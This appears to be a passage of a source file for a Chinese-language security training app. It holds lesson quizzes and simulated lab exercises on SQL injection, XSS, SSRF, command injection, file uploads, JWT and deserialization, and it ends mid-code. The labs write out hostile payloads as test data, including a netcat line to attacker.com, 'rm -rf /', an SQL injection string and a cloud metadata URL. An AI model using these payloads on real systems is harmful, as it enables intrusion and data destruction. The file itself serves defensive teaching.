  codeExample:{language:'python',code:`# Web安全综合实验\nimport hashlib, hmac\n\n# 1. 密码安全存储\npassword = \"MyP@ssw0rd!\"\nsalt = \"random_salt_2024\"\nhashed = hashlib.pbkdf2_hmac(\"sha256\", password.encode(), salt.encode(), 100000)\nprint(f\"PBKDF2哈希: {hashed.hex()[:32]}...\")\n\n# 2. CSRF Token生成\ntoken = hashlib.sha256(os.urandom(32)).hexdigest()\nprint(f\"CSRF Token: {token[:40]}...\")\n\n# 3. 输入安全验证\ndef safe_input(s):\n    import re\n    return bool(re.match(r'^[a-zA-Z0-9_@.-]+$', s))\n\nprint(f\"合法输入测试: {safe_input('user@email.com')}\")\nprint(f\"注入攻击测试: {safe_input('DROP TABLE users;--')}\")',description:'Web安全漏洞演示'},
  quiz:[{"id":"q34-1","question":"CSRF利用了什么进行攻击？","options":["SQL漏洞", "用户已登录的Cookie/Session", "XSS注入点", "服务器配置错误"],"correctIndex":1,"explanation":"CSRF盗用用户已登录的身份凭证。"},{"id":"q34-2","question":"CSRF防御最主要手段是？","options":["输入过滤", "CSRF Token验证", "HTTPS加密", "IP白名单"],"correctIndex":1,"explanation":"Token验证是主要防御手段。"},{"id":"q34-3","question":"SameSite=Strict的效果？","options":["允许所有跨站请求", "完全阻止跨站请求携带Cookie", "仅允许GET请求", "仅允许POST请求"],"correctIndex":1,"explanation":"Strict完全阻止跨站携带Cookie。"},{"id":"q34-4","question":"CSRF与XSS的核心区别？","options":["CSRF需要注入脚本", "CSRF利用用户已登录身份执行操作", "CSRF比XSS危害更大", "CSRF只能攻击GET请求"],"correctIndex":1,"explanation":"CSRF不注入脚本，利用现有登录态。"},{"id":"q34-5","question":"CSRF Token的正确存储方式？","options":["URL参数中", "Cookie中", "Session+表单隐藏字段", "LocalStorage"],"correctIndex":2,"explanation":"Token在Session和表单双存，提交时比对。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[34]||[],
});
allDays.push({
  id:'day-35',day:35,week:5,title:'数字签名与 PKI 体系：从签名原理到信任模型（加密技术）',
  objectives:['数字签名原理','签名流程与验证','PKI 体系架构'],
  content:'DAY35-PLACEHOLDER',
﻿export interface CodeExample {
  language: string;
  code: string;
  description: string;
}

// 与 hooks/useQuiz.ts 保持同步
export interface QuizQuestion {
  id?: string;
  question: string;
  options?: string[];
  correctIndex?: number;
  correctAnswer?: string;
  type?: 'single' | 'multiple' | 'boolean' | 'fill';
  correctIndices?: number[];
  explanation: string;
}

export interface LabTool {
  id: string;
  name: string;
  description: string;
  url: string;
}

export interface LabEnvironment {
  id: string;
  name: string;
  description: string;
  url: string;
}

export interface ExpertNote {
  author: string;
  title: string;
  content: string;
  url: string;
}

export interface LearningDay {
  id: string;
  day: number;
  week: number;
  title: string;
  objectives: string[];
  content: string;
  codeExample?: CodeExample;
  quiz: QuizQuestion[];
  resources?: string[];
  recommendedTools?: LabTool[];
  labEnvironments?: LabEnvironment[];
  expertNotes?: ExpertNote[];
}

export interface Experiment {
  id: string;
  title: string;
  description: string;
  difficulty: 'easy' | 'medium' | 'hard';
  instructions: string[];
  initialCode: string;
  expectedOutput: string;
  hints: string[];
}

export const weekThemes = [
  { week: 1, theme: '信息安全基础', color: '#00ff88' },
  { week: 2, theme: '信息安全法规', color: '#00d4ff' },
  { week: 3, theme: '访问控制', color: '#ffd700' },
  { week: 4, theme: '安全运营', color: '#ff3366' },
  { week: 5, theme: '漏洞与攻击', color: '#00ff88' },
  { week: 6, theme: '加密技术', color: '#00d4ff' },
  { week: 7, theme: '网络安全', color: '#ffd700' },
  { week: 8, theme: '应用安全', color: '#ff3366' },
  { week: 9, theme: '物理安全', color: '#00ff88' },
  { week: 10, theme: '安全工程', color: '#00d4ff' },
  { week: 11, theme: '业务安全', color: '#ffd700' },
  { week: 12, theme: '模拟考试', color: '#ff3366' },
];

export const experiments: Experiment[] = [
  {
    id: 'sql-injection',
    title: 'SQL注入攻击模拟',
    description: '学习如何发现和防止SQL注入漏洞',
    difficulty: 'medium',
    instructions: [
      '这是一个模拟的登录系统',
      '尝试使用SQL注入绕过身份验证',
      '输入: admin\' OR \'1\'=\'1',
      '观察查询结果的变化',
    ],
    initialCode: `# 模拟SQL查询
username = input("用户名: ")
password = input("密码: ")

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

print(f"执行的SQL: {query}")
print("-" * 50)

if "OR" in username or "'" in username:
    print("警告: 检测到可疑输入!")
    print("实际应该使用参数化查询")
else:
    print("查询执行中...")`,
    expectedOutput: '检测到SQL注入攻击',
    hints: ['使用单引号破坏SQL语法', 'OR条件永真'],
  },
  {
    id: 'xss-demo',
    title: 'XSS跨站脚本攻击',
    description: '了解XSS攻击的原理和防护措施',
    difficulty: 'easy',
    instructions: [
      '这是一个评论系统',
      '尝试输入HTML或JavaScript代码',
      '观察输入是如何被处理的',
      '学习如何正确转义用户输入',
    ],
    initialCode: `# 模拟评论系统
comment = input("输入评论: ")

print("=" * 50)
print("未处理的输出:")
print(comment)
print("=" * 50)

if "<script>" in comment.lower():
    print("警告: 检测到脚本标签!")
    print("这是XSS攻击!")
else:
    print("评论已提交")`,
    expectedOutput: '检测到XSS攻击',
    hints: ['使用script标签', '尝试事件处理器'],
  },
  {
    id: 'password-crack',
    title: '密码暴力破解模拟',
    description: '理解弱密码的危险性',
    difficulty: 'easy',
    instructions: [
      '模拟暴力破解弱密码',
      '观察不同密码长度对安全性的影响',
      '了解密码强度的重要性',
    ],
    initialCode: `import itertools
import string

def try_password(target, charset, max_len):
    attempts = 0
    for length in range(1, max_len + 1):
        for guess in itertools.product(charset, repeat=length):
            attempts += 1
            password = ''.join(guess)
            if password == target:
                return attempts
    return None

target_password = "abc"

print("密码破解模拟器")
print("=" * 50)
print(f"目标密码: {target_password}")

result = try_password(target_password, string.ascii_lowercase, 4)

if result:
    print(f"密码被破解! 共尝试 {result:,} 次")`,
    expectedOutput: '密码被破解',
    hints: ['弱密码容易被快速破解', '增加密码长度和复杂度'],
  },
  {
    id: 'log-analysis',
    title: '日志分析练习',
    description: '学习从日志中发现安全威胁',
    difficulty: 'medium',
    instructions: [
      '分析提供的日志条目',
      '识别潜在的安全威胁',
      '标记可疑的活动模式',
    ],
    initialCode: `# 模拟日志分析
logs = [
    "2024-01-15 08:00:01 GET /index.html 200",
    "2024-01-15 08:00:02 POST /login 200",
    "2024-01-15 08:00:03 POST /login 401",
    "2024-01-15 08:00:04 POST /login 401",
    "2024-01-15 08:00:05 POST /login 401",
]

print("安全日志分析器")
print("=" * 60)

failed_logins = sum(1 for log in logs if "401" in log)
print(f"失败登录次数: {failed_logins}")

if failed_logins >= 3:
    print("警告: 检测到可能的暴力破解攻击!")`,
    expectedOutput: '警告: 检测到暴力破解攻击',
    hints: ['关注401状态码', '注意/admin路径的访问'],
  },
  {
    id: 'hash-demo',
    title: '哈希函数实践',
    description: '理解哈希在数据完整性中的应用',
    difficulty: 'easy',
    instructions: [
      '计算文件的哈希值',
      '验证数据完整性',
      '了解哈希碰撞',
    ],
    initialCode: `import hashlib

def calculate_hash(data, algorithm='sha256'):
    hash_obj = hashlib.new(algorithm)
    hash_obj.update(data.encode('utf-8'))
    return hash_obj.hexdigest()

test_data = "这是重要的配置文件内容"

print("哈希计算器")
print("=" * 50)
print(f"原始数据: {test_data}")

for algo in ['md5', 'sha1', 'sha256']:
    hash_value = calculate_hash(test_data, algo)
    print(f"{algo.upper()}: {hash_value}")`,
    expectedOutput: '哈希值计算完成',
    hints: ['哈希是单向函数', '无法从哈希反推原始数据'],
  },
  {
    id: 'encrypt-decrypt',
    title: '对称加密演示',
    description: '学习对称加密的原理',
    difficulty: 'medium',
    instructions: [
      '使用简单加密算法加密数据',
      '理解密钥的重要性',
      '了解加密和解密过程',
    ],
    initialCode: `# 简单的XOR加密演示
def xor_encrypt(text, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key * (len(text) // len(key) + 1)))

message = "密码是Secret123"
key = "KEY"

print("XOR加密演示")
print("=" * 50)
print(f"原始消息: {message}")

encrypted = xor_encrypt(message, key)
print(f"加密后: {repr(encrypted)}")

decrypted = xor_encrypt(encrypted, key)
print(f"解密后: {decrypted}")`,
    expectedOutput: '加密解密完成',
    hints: ['XOR是简单的加密方法', '密钥长度很重要'],
  },
  {
    id: 'firewall-rules',
    title: '防火墙规则配置',
    description: '学习基本的防火墙规则',
    difficulty: 'hard',
    instructions: [
      '根据需求配置防火墙规则',
      '理解规则优先级',
      '测试规则的有效性',
    ],
    initialCode: `# 模拟防火墙规则配置
rules = [
    {"action": "ALLOW", "port": 80, "desc": "HTTP"},
    {"action": "ALLOW", "port": 443, "desc": "HTTPS"},
    {"action": "DENY", "port": 22, "desc": "SSH"},
]

packets = [
    {"port": 80, "ip": "203.0.113.50"},
    {"port": 22, "ip": "198.51.100.25"},
]

print("防火墙规则模拟器")
print("=" * 60)

for packet in packets:
    print(f"数据包: port {packet['port']} from {packet['ip']}")
    for rule in rules:
        if rule['port'] == packet['port']:
            print(f"  -> {rule['action']} ({rule['desc']})")
            break`,
    expectedOutput: '防火墙过滤完成',
    hints: ['规则按顺序匹配', '考虑源IP地址限制'],
  },
  {
    id: 'port-scan',
    title: '端口扫描模拟',
    description: '学习Nmap端口扫描原理',
    difficulty: 'medium',
    instructions: [
      '了解端口扫描的基本原理',
      '学习TCP全连接扫描和SYN半开扫描',
      '识别常见端口对应的服务',
      '观察扫描结果并分析',
    ],
    initialCode: `# 模拟端口扫描
import socket

target = "127.0.0.1"
common_ports = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    3306: "MySQL",
    3389: "RDP",
}

print(f"端口扫描目标: {target}")
print("=" * 60)

open_ports = []
for port in common_ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((target, port))
    if result == 0:
        open_ports.append(port)
        print(f"[+] 端口 {port} ({common_ports[port]}) - 开放")
    sock.close()

print("=" * 60)
print(f"扫描完成，发现 {len(open_ports)} 个开放端口")`,
    expectedOutput: '端口扫描完成',
    hints: ['端口对应应用层服务', '扫描应获得授权进行'],
  },
  {
    id: 'vuln-scan',
    title: '漏洞扫描练习',
    description: '学习漏洞扫描工具使用',
    difficulty: 'hard',
    instructions: [
      '理解漏洞编号（CVE）和评分（CVSS）',
      '学习漏洞扫描报告的解读',
      '根据风险等级制定处置方案',
      '了解漏洞修复优先级',
    ],
    initialCode: `# 漏洞扫描结果分析示例
vulnerabilities = [
    {"cve": "CVE-2023-0001", "cvss": 9.8, "severity": "严重", "description": "远程代码执行漏洞"},
    {"cve": "CVE-2023-0002", "cvss": 7.5, "severity": "高危", "description": "SQL注入漏洞"},
    {"cve": "CVE-2023-0003", "cvss": 5.3, "severity": "中危", "description": "信息泄露漏洞"},
    {"cve": "CVE-2023-0004", "cvss": 3.7, "severity": "低危", "description": "配置信息泄露"},
]

print("漏洞扫描报告")
print("=" * 70)
print(f"{'CVE编号':<20} {'CVSS评分':<12} {'严重级别':<10} {'描述'}")
print("-" * 70)

total_score = 0
severity_count = {"严重": 0, "高危": 0, "中危": 0, "低危": 0}

for vuln in vulnerabilities:
    print(f"{vuln['cve']:<20} {vuln['cvss']:<12} {vuln['severity']:<10} {vuln['description']}")
    total_score += vuln['cvss']
    severity_count[vuln['severity']] += 1

print("=" * 70)
print(f"漏洞总数: {len(vulnerabilities)} | 平均CVSS: {total_score/len(vulnerabilities):.1f}")
print(f"严重:{severity_count['严重']} 高危:{severity_count['高危']} 中危:{severity_count['中危']} 低危:{severity_count['低危']}")`,
    expectedOutput: '漏洞扫描分析完成',
    hints: ['CVSS分数越高风险越大', '严重漏洞需优先修复'],
  },
  {
    id: 'access-control',
    title: '访问控制模型',
    description: '理解DAC/MAC/RBAC模型',
    difficulty: 'medium',
    instructions: [
      '理解自主访问控制（DAC）',
      '理解强制访问控制（MAC）',
      '理解基于角色的访问控制（RBAC）',
      '比较三种模型的适用场景',
    ],
    initialCode: `# 三种访问控制模型演示

# 1. DAC (自主访问控制): 资源所有者决定权限
print("=" * 60)
print("DAC - 自主访问控制")
print("=" * 60)
files_dac = {
    "report.txt": {"owner": "Alice", "permissions": {"Alice": "rw", "Bob": "r"}},
}
for fname, finfo in files_dac.items():
    print(f"文件: {fname}, 所有者: {finfo['owner']}")
    for user, perm in finfo['permissions'].items():
        print(f"  {user}: {perm}")

# 2. MAC (强制访问控制): 系统根据安全标签决定
print()
print("=" * 60)
print("MAC - 强制访问控制")
print("=" * 60)
users_mac = {"Alice": "秘密", "Bob": "公开"}
data_mac = {"doc1": "秘密", "doc2": "公开"}
for user, level in users_mac.items():
    for doc, dlevel in data_mac.items():
        access = "允许" if (level == dlevel or (level == "秘密" and dlevel == "公开")) else "拒绝"
        print(f"{user}({level}) 访问 {doc}({dlevel}): {access}")

# 3. RBAC (基于角色的访问控制): 根据角色分配权限
print()
print("=" * 60)
print("RBAC - 基于角色的访问控制")
print("=" * 60)
roles = {"管理员": ["查看", "修改", "删除"], "普通用户": ["查看"]}
user_roles = {"Alice": "管理员", "Bob": "普通用户"}
for user, role in user_roles.items():
    print(f"{user} ({role}): {', '.join(roles[role])}")`,
    expectedOutput: '三种访问控制模型演示完成',
    hints: ['RBAC最常用，MAC最严格', '适合的场景选择合适的模型'],
  },
  {
    id: 'incident-response',
    title: '安全事件响应',
    description: '学习应急响应流程',
    difficulty: 'medium',
    instructions: [
      '理解安全事件响应六阶段',
      '学习各阶段的核心任务',
      '了解事件响应团队组成',
      '掌握事件报告的基本要素',
    ],
    initialCode: `# 安全事件响应流程
incident_stages = [
    ("1. 准备阶段", "建立响应团队、应急预案、工具准备、培训演练"),
    ("2. 检测阶段", "监控告警、日志分析、异常识别、事件确认"),
    ("3. 遏制阶段", "隔离受影响系统、阻断攻击、防止扩散"),
    ("4. 根除阶段", "清除恶意软件、修补漏洞、移除后门"),
    ("5. 恢复阶段", "验证系统完整性、恢复服务、监控运行"),
    ("6. 总结阶段", "事件复盘、流程改进、经验归档、报告撰写"),
]

print("安全事件响应六阶段")
print("=" * 70)

for stage_name, stage_desc in incident_stages:
    print(f"{stage_name}")
    print(f"  {stage_desc}")
    print()

# 模拟事件响应评估
print("=" * 70)
print("事件响应能力评估")
print("=" * 70)

preparedness = {
    "应急预案": True,
    "响应团队": True,
    "监控工具": False,
    "定期演练": False,
}

score = sum(1 for v in preparedness.values() if v)
total = len(preparedness)
for item, status in preparedness.items():
    symbol = "[OK]" if status else "[待改进]"
    print(f"  {symbol} {item}")
print(f"  准备程度: {score}/{total} ({score/total*100:.0f}%)")`,
    expectedOutput: '事件响应流程演示完成',
    hints: ['准备阶段最重要', '遏制要快，根除要彻底'],
  },
  {
    id: 'risk-assessment',
    title: '风险评估计算',
    description: '学习信息安全风险评估方法',
    difficulty: 'easy',
    instructions: [
      '理解风险公式: 风险 = 威胁 × 脆弱性 × 影响',
      '学习风险矩阵的使用',
      '掌握风险处置策略',
      '练习风险等级判定',
    ],
    initialCode: `# 信息安全风险评估
def calculate_risk(threat, vulnerability, impact):
    """
    风险值 = 威胁 × 脆弱性 × 影响
    每项分值 1-5, 最高风险值 125
    """
    risk_value = threat * vulnerability * impact
    if risk_value >= 100:
        level = "极高风险"
        action = "立即处置"
    elif risk_value >= 50:
        level = "高风险"
        action = "优先处置"
    elif risk_value >= 20:
        level = "中风险"
        action = "计划处置"
    else:
        level = "低风险"
        action = "接受或监控"
    return risk_value, level, action

# 风险场景评估
scenarios = [
    ("Web应用SQL注入", 4, 5, 4),
    ("机房物理访问", 2, 3, 5),
    ("密码被暴力破解", 3, 4, 3),
    ("员工丢失U盘", 3, 2, 2),
]

print("信息安全风险评估表")
print("=" * 80)
print(f"{'风险场景':<20} {'威胁':<6} {'脆弱性':<6} {'影响':<6} {'风险值':<8} {'等级':<12} {'处置策略'}")
print("-" * 80)

for name, t, v, i in scenarios:
    rv, level, action = calculate_risk(t, v, i)
    print(f"{name:<20} {t:<8} {v:<8} {i:<6} {rv:<10} {level:<14} {action}")

print("=" * 80)
print()
print("风险处置策略:")
print("  避免: 消除风险源 / 降低: 减小风险 / 转移: 保险外包 / 接受: 承担风险")`,
    expectedOutput: '风险评估计算完成',
    hints: ['风险值越高越紧急', '处置策略需平衡成本和收益'],
  },
  {
    id: 'web-vuln',
    title: 'OWASP Top 10漏洞识别',
    description: '识别常见Web安全漏洞',
    difficulty: 'medium',
    instructions: [
      '了解OWASP Top 10十大Web漏洞',
      '学习各漏洞的原理和危害',
      '掌握漏洞识别方法',
      '理解基本防护措施',
    ],
    initialCode: `# OWASP Top 10 常见Web漏洞识别
vulnerabilities = [
    ("A01: 访问控制失效", "未受保护的管理后台 /admin", "后台应仅允许特定IP"),
    ("A02: 认证失败", "弱密码 admin/admin123", "强制强密码+多因素认证"),
    ("A03: 注入漏洞", "SQL注入: ' OR '1'='1", "参数化查询+输入验证"),
    ("A04: 不安全设计", "缺乏风控的大额转账", "业务逻辑安全设计"),
    ("A05: 安全配置错误", "默认密码未修改 / 调试模式开启", "加固配置+定期审计"),
    ("A06: 易受攻击和过时组件", "使用含漏洞的第三方库", "依赖扫描+及时更新"),
    ("A07: 识别和认证失败", "会话固定攻击", "登录后重新生成会话ID"),
    ("A08: 软件和数据完整性失败", "下载文件被篡改", "数字签名+哈希校验"),
    ("A09: 安全日志和监控不足", "不记录登录失败日志", "完善日志+实时告警"),
    ("A10: SSRF 服务端请求伪造", "服务器访问内部资源 http://localhost", "限制出站请求"),
]

print("OWASP Top 10 Web安全漏洞")
print("=" * 80)

for code, name in enumerate(vulnerabilities, 1):
    cat, example, fix = name
    print(f"{cat}")
    print(f"  示例: {example}")
    print(f"  防护: {fix}")
    print()

print("=" * 80)
print("测试: 判断以下场景属于哪类漏洞?")
print("场景1: 用户输入 <script>alert(1)</script> 在评论中执行")
print("场景2: 用户修改 URL ?user_id=123 可以查看他人数据")
print("场景3: 使用已知有漏洞的 Log4j 版本")`,
    expectedOutput: 'Web漏洞识别演示完成',
    hints: ['XSS属于注入类', '越权属于访问控制类'],
  },
  {
    id: 'csrf-attack',
    title: 'CSRF攻击与防护',
    description: '理解跨站请求伪造攻击原理与Token防护',
    difficulty: 'easy',
    instructions: [
      '理解CSRF攻击的原理：利用用户已登录状态发起恶意请求',
      '学习CSRF Token防护机制',
      '比较SameSite Cookie属性三种模式',
      '掌握Referer/Origin头校验方法',
    ],
    initialCode: `# CSRF 跨站请求伪造演示
import hashlib, secrets, time

class CSRFSimulator:
    def __init__(self):
        self.sessions = {}
        self.csrf_tokens = {}

    def login(self, user):
        sid = secrets.token_hex(16)
        self.sessions[sid] = user
        return sid

    def generate_csrf_token(self, session_id):
        token = secrets.token_hex(32)
        self.csrf_tokens[session_id] = token
        return token

    def validate_transfer(self, session_id, csrf_token):
        if session_id not in self.sessions:
            return "ERROR: 未登录"
        if csrf_token != self.csrf_tokens.get(session_id):
            return "BLOCKED: CSRF攻击拦截! Token验证失败"
        return "SUCCESS: 转账成功"

# 模拟场景
bank = CSRFSimulator()
s1 = bank.login("Alice")
tok = bank.generate_csrf_token(s1)

print("=" * 60)
print("CSRF攻击与防护模拟")
print("=" * 60)

# 正常请求
print(f"1. 正常转账(带Token): {bank.validate_transfer(s1, tok)}")

# CSRF攻击尝试(无Token)
print(f"2. 伪造请求(无Token): {bank.validate_transfer(s1, 'fake_token')}")

# SameSite Cookie 对比
print()
print("SameSite Cookie 属性对比:")
print("  Strict  : 完全禁止第三方请求携带Cookie")
print("  Lax     : 允许GET导航请求，禁止POST")
print("  None    : 允许(需配合Secure属性)")

print()
print("防护建议: CSRF Token + SameSite=Strict + Referer校验")`,
    expectedOutput: 'CSRF攻击拦截',
    hints: ['CSRF利用的是浏览器自动携带Cookie', 'Token是最可靠的防御'],
  },
  {
    id: 'ssrf-attack',
    title: 'SSRF漏洞利用与防护',
    description: '理解服务端请求伪造攻击原理',
    difficulty: 'medium',
    instructions: [
      '理解SSRF攻击如何让服务器发起恶意请求',
      '学习常见SSRF利用场景（内网探测、云元数据窃取）',
      '掌握URL白名单和输入校验防护方法',
      '了解DNS重绑定绕过技术',
    ],
    initialCode: `# SSRF 服务端请求伪造演示
import re

# 模拟内部网络架构
internal_services = {
    "192.168.1.100:8080": "内部管理系统",
    "169.254.169.254": "云实例元数据API",
    "127.0.0.1:6379": "Redis缓存服务",
    "127.0.0.1:22": "SSH服务",
    "10.0.0.1:3306": "内部MySQL数据库",
}

def fetch_url_vulnerable(target_url):
    """不安全的URL请求（存在SSRF漏洞）"""
    print(f"  请求: {target_url}")
    # 检查是否访问了内部服务
    for addr, svc in internal_services.items():
        if addr in target_url:
            print(f"  [WARNING] 访问了内部服务: {svc} ({addr})")
            return f"SSRF! 泄露数据: {svc}"
    print(f"  正常外部请求")
    return "OK"

def fetch_url_safe(target_url):
    """安全的URL请求（SSRF防护）"""
    # 黑名单检查
    blocked = ['127.0.0.1', 'localhost', '169.254', '10.', '192.168.']
    for b in blocked:
        if b in target_url:
            return f"BLOCKED: 检测到内部地址 {b}"
    
    # 白名单域名
    allowed = ['api.example.com', 'cdn.example.com']
    domain = target_url.split('/')[2] if '://' in target_url else ''
    if domain and domain not in allowed:
        return f"BLOCKED: {domain} 不在白名单中"
    
    return f"ALLOWED: 安全访问 {target_url}"

print("=" * 60)
print("SSRF漏洞演示")
print("=" * 60)

# 攻击场景
print("\\n[攻击尝试 - 无防护]")
urls = [
    "http://api.example.com/data",
    "http://169.254.169.254/latest/meta-data",
    "http://127.0.0.1:6379/",
    "http://10.0.0.1:3306/",
]
for u in urls:
    print(fetch_url_vulnerable(u))

print("\\n[安全防护 - 开启过滤]")
for u in urls:
    print(fetch_url_safe(u))

print("\\n防护方案: URL白名单 + 内网地址过滤 + 禁用非必要协议")`,
    expectedOutput: 'BLOCKED',
    hints: ['SSRF常用于攻击内网服务', '永远不要信任用户提供的URL'],
  },
  {
    id: 'command-injection',
    title: '命令注入攻击',
    description: '学习命令注入原理与输入过滤防护',
    difficulty: 'medium',
    instructions: [
      '理解命令注入如何通过拼接执行系统命令',
      '学习常见命令注入payload（分号、管道、反引号）',
      '掌握输入校验和沙箱化防护',
      '了解安全的API调用方式替代系统命令',
    ],
    initialCode: `# 命令注入攻击演示
import shlex, re

def execute_command_unsafe(user_input):
    """不安全的命令执行"""
    cmd = f"ping -c 2 {user_input}"
    print(f"  执行: {cmd}")
    
    dangerous = [';', '|', '&', '\`', '$', '&&', '||']
    for ch in dangerous:
        if ch in user_input:
            extra = user_input.split(ch, 1)[1].strip()
            print(f"  [ALERT] 检测到命令注入! 额外命令: {extra}")
            return "BLOCKED"
    return f"OK: ping {user_input}"

def execute_command_safe(user_input):
    """安全的命令执行"""
    # 白名单: 只允许IP和域名格式
    pattern = r'^[a-zA-Z0-9.-]+$'
    if not re.match(pattern, user_input):
        return f"REJECTED: 输入包含非法字符"
    if len(user_input) > 100:
        return "REJECTED: 输入过长"
    # 使用shlex安全分割
    safe_args = shlex.quote(user_input)
    print(f"  执行: ping -c 2 {safe_args}")
    return f"SAFE: ping {user_input}"

print("=" * 60)
print("命令注入攻击与防护")
print("=" * 60)

payloads = [
    "google.com",
    "google.com; cat /etc/passwd",
    "google.com && rm -rf /",
    "google.com | nc attacker.com 4444",
]

print("\\n[不安全执行]")
for p in payloads:
    print(execute_command_unsafe(p))

print("\\n[安全执行 - 白名单过滤]")
for p in payloads:
    print(execute_command_safe(p))

print("\\n防护要点: 避免系统命令 → 用API替代 → 输入白名单 → 参数化")`,
    expectedOutput: '命令注入检测',
    hints: ['避免直接拼接用户输入到命令中', '尽量使用编程语言API替代shell命令'],
  },
  {
    id: 'file-upload-vuln',
    title: '文件上传漏洞',
    description: '学习文件上传安全检测与绕过技术',
    difficulty: 'medium',
    instructions: [
      '理解文件上传漏洞的危害（WebShell、RCE）',
      '学习文件类型验证方法（MIME、扩展名、魔术字节）',
      '了解常见绕过技术（双扩展名、%00截断）',
      '掌握安全的文件上传处理流程',
    ],
    initialCode: `# 文件上传安全检测
import re, hashlib

MAGIC_BYTES = {
    "jpg": b'\\xff\\xd8\\xff',
    "png": b'\\x89PNG\\r\\n\\x1a\\n',
    "gif": b'GIF89a',
    "pdf": b'%PDF',
}

DANGEROUS_EXT = {
    "php", "jsp", "asp", "aspx", "exe", "sh", 
    "py", "pl", "cgi", "war", "jspx", "phtml"
}

def check_upload_unsafe(filename, content_type):
    """不安全的文件上传检测"""
    ext = filename.split('.')[-1].lower()
    print(f"  文件名: {filename}, Content-Type: {content_type}")
    
    if ext in DANGEROUS_EXT:
        print(f"  被拦截（仅黑名单检查）")
        return "BLOCKED"
    return "ALLOWED"

def check_upload_safe(filename, content_type, content_sample):
    """安全的文件上传检测"""
    ext = filename.split('.')[-1].lower()
    
    checks = []
    # 1. Content-Type白名单
    allowed_types = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
    if content_type not in allowed_types:
        checks.append(f"- Content-Type {content_type} 不允许")
    
    # 2. 扩展名白名单
    allowed_ext = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
    if ext not in allowed_ext:
        checks.append(f"- 扩展名 .{ext} 不允许")
    
    # 3. 魔术字节校验
    if ext in ['jpg', 'jpeg', 'png', 'gif']:
        expected_magic = MAGIC_BYTES.get(ext, b'')
        if not content_sample.startswith(expected_magic):
            checks.append(f"- 文件魔术字节不匹配 {ext}")
    
    if checks:
        for c in checks: print(f"  {c}")
        return "BLOCKED"
    return "ALLOWED"

print("=" * 60)
print("文件上传安全检测")
print("=" * 60)

files = [
    ("avatar.jpg", "image/jpeg", b'\\xff\\xd8\\xffIMG'),
    ("shell.php.jpg", "image/jpeg", b'\\xff\\xd8\\xffPHP'),
    ("evil.php", "application/x-httpd-php", b'<?php system'),
    ("report.pdf", "application/pdf", b'%PDFdoc'),
]

print("\\n[基础检测 - 仅黑名单]")
for name, ctype, _ in files:
    print(check_upload_unsafe(name, ctype))

print("\\n[安全检测 - 多层验证]")
for name, ctype, sample in files:
    print(check_upload_safe(name, ctype, sample))

print("\\n防护: 白名单+MIME+魔术字节+重命名+隔离存储")`,
    expectedOutput: '文件上传安全检测完成',
    hints: ['不要依赖黑名单过滤', '魔术字节是文件真实类型的可靠依据'],
  },
  {
    id: 'jwt-security',
    title: 'JWT令牌安全',
    description: '理解JWT攻击面与安全最佳实践',
    difficulty: 'medium',
    instructions: [
      '理解JWT结构（Header.Payload.Signature）',
      '学习JWT常见漏洞（none算法、弱密钥、密钥泄露）',
      '掌握JWT安全配置最佳实践',
      '了解JWT vs Session的适用场景',
    ],
    initialCode: `# JWT 安全模拟
import base64, json, hashlib, hmac, time

# 模拟Base64URL编解码
def b64url_decode(s):
    s = s + '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s).decode()

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

class JWTSimulator:
    def __init__(self, secret="super-secret-key-256!"):
        self.secret = secret

    def create_token(self, payload, algorithm="HS256"):
        header = json.dumps({"alg": algorithm, "typ": "JWT"})
        h_enc = b64url_encode(header.encode())
        p_enc = b64url_encode(json.dumps(payload).encode())
        msg = f"{h_enc}.{p_enc}"
        sig = hmac.new(self.secret.encode(), msg.encode(), 'sha256').hexdigest()[:32]
        return f"{msg}.{sig}"

    def verify_token(self, token, algorithm="HS256"):
        parts = token.split('.')
        if len(parts) != 3:
            return None, "格式错误"
        
        header = json.loads(b64url_decode(parts[0]))
        
        # 检查危险算法
        if header.get('alg') == 'none':
            return None, "ALERT: none算法攻击!"
        
        if header.get('alg') == 'HS256' and algorithm == 'RS256':
            return None, "ALERT: 算法混淆攻击! 期望RS256但收到HS256"
        
        msg = f"{parts[0]}.{parts[1]}"
        expected_sig = hmac.new(self.secret.encode(), msg.encode(), 'sha256').hexdigest()[:32]
        
        if parts[2] != expected_sig:
            return None, "签名验证失败"
        
        payload = json.loads(b64url_decode(parts[1]))
        if payload.get('exp', 0) < time.time():
            return None, "令牌已过期"
        
        return payload, "OK"

print("=" * 60)
print("JWT安全漏洞演示")
print("=" * 60)

jwt = JWTSimulator()

# 正常令牌
token1 = jwt.create_token({"user": "admin", "role": "user", "exp": time.time()+3600})
print(f"\\n正常令牌: {token1[:50]}...")
print(f"验证结果: {jwt.verify_token(token1)}")

# None算法攻击
none_token = b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
none_token += "." + b64url_encode(json.dumps({"user":"admin","role":"admin"}).encode()) + ".xxx"
print(f"\\nNone算法攻击令牌: {none_token[:50]}...")
print(f"验证结果: {jwt.verify_token(none_token)}")

print("\\nJWT安全建议:")
print("  1. 明确指定算法白名单,拒绝'none'")
print("  2. 使用强密钥(>=256位)")
print("  3. 设置合理的过期时间")
print("  4. 不在payload中存放敏感信息")`,
    expectedOutput: 'none算法攻击',
    hints: ['永远不要允许alg=none', 'JWT Payload仅Base64编码非加密'],
  },
  {
    id: 'deserialization-vuln',
    title: '不安全反序列化',
    description: '理解序列化攻击原理与安全防护',
    difficulty: 'hard',
    instructions: [
      '理解序列化/反序列化的安全风险',
      '了解pickle反序列化RCE的原理',
      '学习JSON等安全替代方案',
      '掌握输入验证和沙箱化技术',
    ],
    initialCode: `# 不安全反序列化漏洞演示
import json, hashlib, hmac, base64

# 模拟Pickle反序列化漏洞
class UnsafePickle:
    """模拟不安全的pickle反序列化"""
    
    def dumps(self, obj):
        data = json.dumps(obj)
        sig = hashlib.md5(data.encode()).hexdigest()  # 弱签名
        return base64.b64encode(data.encode()).decode()
    
    def loads(self, data):
